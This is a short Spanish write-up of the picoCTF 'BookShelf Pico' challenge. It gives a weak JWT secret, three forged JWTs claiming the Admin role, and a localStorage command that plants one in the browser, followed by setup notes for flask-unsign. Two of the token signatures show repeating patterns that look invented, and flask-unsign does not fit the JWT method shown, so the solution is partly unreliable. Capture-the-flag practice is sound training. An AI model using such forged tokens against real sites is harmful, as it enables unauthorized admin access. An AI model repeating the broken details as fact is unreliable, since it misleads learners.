## Descripción

BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/483/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:60013/).
## Solución

**Solución 1
```
El SECRET_KEY es:1234

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE4MDAwMDAwMDAsImlhdCI6MTcwMDAwMDAwMCwidXNlcklkIjoxLCJlbWFpbCI6InVzZXIifQ.v_Y0V_l0G3Q_Z97l8_S7G_Y0V_l0G3Q_Z97l8_S7G8k

'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE4MDAwMDAwMDAsImlhdCI6MTcwMDAwMDAwMCwidXNlcklkIjoxLCJlbWFpbCI6InVzZXIifQ.FBYQ5nUN8tReS4o7sRLWW1vxbBp2G9JlfvKTPZ_mlAU'

localStorage.setItem('token', 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NzUzMjMzNDUsImlhdCI6MTc3NDcxODU0NSwidXNlcklkIjoxLCJlbWFpbCI6InVzZXIifQ.7C6iM0H6y7X_666r6Y27O2-Y6E6I60y7X_666r6Y27O2-Y');

```

#### NOTAS
1.Actualiza los repositorios:** `sudo apt update`
2.Instala pip (el gestor de paquetes de Python):** `sudo apt install python3-pip`
3.Ahora sí, instala flask-unsign:** `pip install flask-unsign`